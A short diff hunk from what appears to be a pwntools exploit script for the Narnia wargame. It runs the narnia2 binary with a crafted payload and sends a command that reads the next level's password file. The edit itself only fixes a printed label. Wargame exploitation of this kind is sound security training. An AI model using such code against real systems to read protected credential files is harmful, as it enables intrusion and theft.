@@ -10,5 +10,5 @@ payload = flat(
 
 p = process([b'/narnia/narnia2', payload])
 p.sendline(b'cat /etc/narnia_pass/narnia3')
-print('\nnarnia2 pass: ' + p.recvline().decode())
+print('\nnarnia3 pass: ' + p.recvline().decode())
 
